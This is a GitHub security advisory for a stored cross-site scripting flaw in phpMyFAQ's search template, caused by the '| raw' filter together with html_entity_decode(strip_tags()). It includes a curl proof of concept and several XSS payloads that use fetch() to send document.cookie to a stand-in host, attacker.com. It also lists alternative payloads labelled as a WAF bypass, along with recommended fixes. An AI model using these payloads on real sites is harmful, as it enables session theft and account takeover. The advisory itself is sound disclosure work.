# [M] phpMyFAQ has stored XSS via | raw Filter in search.twig — html_entity_decode(strip_tags()) Bypass in Search Result Rendering

## Summary
Severity: Medium
Advisory: GHSA-pqh6-8fxf-jx22
CVE: CVE-2026-46361
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-pqh6-8fxf-jx22
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

The search result rendering template (`search.twig`) outputs FAQ content fields `result.question` and `result.answerPreview` using Twig's `| raw` filter, which completely disables the template engine's built-in auto-escaping.

A user with FAQ editor/contributor privileges can store a payload encoded as HTML entities. During search result construction, `html_entity_decode(strip_tags(...))` restores the raw HTML tags — bypassing `strip_tags()` — and the restored payload is injected into every visitor's browser via the `| raw` output.

This vulnerability is distinct from GHSA-cv2g-8cj8-vgc7 (affects `faq.twig`, bypass via regex mismatch in `Filter::removeAttributes()`) and is not addressed by the 4.1.1 patch.

---

## Affected Files

| File | Location | Issue |
|---|---|---|
| `phpmyfaq/assets/templates/default/search.twig` | lines rendering `result.question`, `result.answerPreview` |  `(Vertical Bar) raw` disables autoescape |
| `phpmyfaq/src/phpMyFAQ/Controller/Api/SearchController.php` | search result processing loop | `html_entity_decode(strip_tags(...))` restores encoded payloads |
| `phpmyfaq/src/phpMyFAQ/Search.php` | `logSearchTerm()` | No HTML sanitization on stored search term (secondary, preventive) |

---

## Details

### Vulnerability A (Primary): `search.twig` — `| raw` Disables Autoescape

**File:** `phpmyfaq/assets/templates/default/search.twig`

```twig
<a title="Test" href="{{ result.url }}">{{ result.question | raw }}</a>
<small class="small">{{ result.answerPreview | raw }}...</small>
```

Twig's autoescape encodes all variables by default. The `| raw` filter unconditionally disables this protection. Both `result.question` and `result.answerPreview` are populated from database content (FAQ records and custom pages) that can contain attacker-controlled data.

Seven (7) instances of `| raw` exist in `search.twig`:

```twig
{{ result.renderedScore | raw }}
{{ result.question | raw }}
{{ result.answerPreview | raw }}
{{ searchTags | raw }}
{{ relatedTags | raw }}
{{ pagination | raw }}
{{ 'help_search' | translate | raw }}
```

Each of these constitutes an independent XSS surface if its data source is compromised.

---

### Vulnerability B (Amplifier): `SearchController.php` — `html_entity_decode(strip_tags())` Bypass

**File:** `phpmyfaq/src/phpMyFAQ/Controller/Api/SearchController.php`

```php
$data->answer = html_entity_decode(
    strip_tags((string) $data->answer),
    ENT_COMPAT,
    encoding: 'utf-8'
);
```

This pattern is a known security anti-pattern. When a payload is stored as HTML entities, `strip_tags()` passes it through unmodified (it sees no actual tags), and `html_entity_decode()` then restores the original HTML tags — reintroducing executable markup that was thought to be neutralized.

**Bypass walkthrough:**
```text
Stored in DB:    <svg onload=fetch('https://attacker.com/?c='+document.cookie)>
strip_tags()   → no change (no real tags detected)
               → <svg onload=fetch('https://attacker.com/?c='+document.cookie)>
html_entity_decode() → <svg onload=fetch('https://attacker.com/?c='+document.cookie)>
| raw output   → executes in browser
```
---

## Attack Chain

**Prerequisites:** Attacker has FAQ editor / contributor role (low privilege).

**Step 1 — Payload injection**

Attacker creates or edits a FAQ entry or custom page with an HTML-entity-encoded XSS payload in the question or answer body:
```html
<svg onload=fetch('[https://attacker.com/?c='+document.cookie](https://attacker.com/?c=%27+document.cookie))>
<img src=x onerror=fetch('[https://attacker.com/?c='+document.cookie](https://attacker.com/?c=%27+document.cookie))>
```
**Step 2 — Persistence**

The payload is stored in the DB without HTML sanitization at the storage layer.

**Step 3 — Victim triggers the XSS**

Any user (including unauthenticated visitors and administrators) searches for a keyword matching the poisoned FAQ. The server:

1. Retrieves the record from the database
2. Applies `strip_tags()` → entity-encoded payload passes through
3. Applies `html_entity_decode()` → raw `<svg onload=...>` is restored
4. Passes the value to `search.twig` as `result.answerPreview`
5. Template renders with `| raw` → XSS executes

**Step 4 — Impact**

- Session cookie exfiltration → full account takeover
- Administrator session hijacking (admin visiting search page)
- Persistent attack: payload fires for every visitor until manually removed
- Potential for worm propagation via auto-created FAQ entries

---

## PoC

**Prerequisites:** Attacker has FAQ editor / contributor role (low privilege).

**Step 1 — Inject payload via FAQ editor:**

```bash
curl -X POST 'https://target.example.com/admin/api/faq/create' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: PHPSESSID=<editor_session>' \
  -d '{
    "data": {
      "pmf-csrf-token": "<valid_csrf_token>",
      "question": "&lt;svg onload=fetch(\u0027https://attacker.com/?c=\u0027+document.cookie)&gt;",
      "answer": "&lt;img src=x onerror=fetch(\u0027https://attacker.com/?c=\u0027+document.cookie)&gt;",
      "lang": "en",
      "categories[]": 1,
      "active": "yes",
      "tags": "test",
      "keywords": "searchable-keyword",
      "author": "attacker",
      "email": "attacker@example.com"
    }
  }'
```

**Step 2 — Trigger XSS as victim:**
```
https://target.example.com/search.html?search=searchable-keyword
```
The search result page renders the restored `<svg onload=...>` payload. The attacker's server receives the victim's session cookie.

**Alternative payloads (for WAF bypass):**

```html
&lt;details open ontoggle=alert(document.cookie)&gt;
&lt;iframe srcdoc="&amp;lt;script&amp;gt;parent.location='https://attacker.com/?c='+document.cookie&amp;lt;/script&amp;gt;"&gt;
```

---

## Impact

- **Confidentiality :** Session cookie exfiltration and credential theft
  via JavaScript execution in victim's browser context.
- **Integrity :** DOM manipulation, phishing overlay injection.
- **Scope :** Attack crosses from contributor privilege context
  to all site visitors, including administrators.

---

## Recommended Fix

### Fix 1 (Critical) — Remove `| raw` from user-controlled fields in `search.twig`

```diff
- <a href="{{ result.url }}">{{ result.question | raw }}</a>
- <small>{{ result.answerPreview | raw }}...</small>
+ <a href="{{ result.url }}">{{ result.question }}</a>
+ <small>{{ result.answerPreview }}...</small>
```

If HTML formatting must be preserved, apply a whitelist-based sanitizer (e.g., `ezyang/htmlpurifier`) **before** passing data to the template, then retain `| raw` only for purified output.

### Fix 2 (Critical) — Remove `html_entity_decode()` from search result pipeline `SearchController.php`

```diff
- $data->answer = html_entity_decode(
-     strip_tags((string) $data->answer),
-     ENT_COMPAT,
-     encoding: 'utf-8'
- );
+ $data->answer = strip_tags((string) $data->answer);
  $data->answer = Utils::makeShorterText(string: $data->answer, characters: 12);
```

### Fix 3 (Recommended) — Audit all `| raw` usages in `search.twig`

The following additional `| raw` instances should be reviewed and sanitized:

```twig
{{ searchTags | raw }}       → apply HTML Purifier or remove | raw
{{ relatedTags | raw }}      → apply HTML Purifier or remove | raw
{{ pagination | raw }}       → safe only if generated entirely server-side with no user input
```

### Fix 4 (Preventive) — Add `htmlspecialchars()` in `logSearchTerm()`

```diff
  $this->configuration->getDb()->escape($searchTerm)
+ htmlspecialchars(
+     $this->configuration->getDb()->escape($searchTerm),
+     ENT_QUOTES | ENT_HTML5,
+     'UTF-8'
+ )
```

---

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-pqh6-8fxf-jx22
- https://nvd.nist.gov/vuln/detail/CVE-2026-46361
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-stored-cross-site-scripting-via-raw-filter-in-search-twig
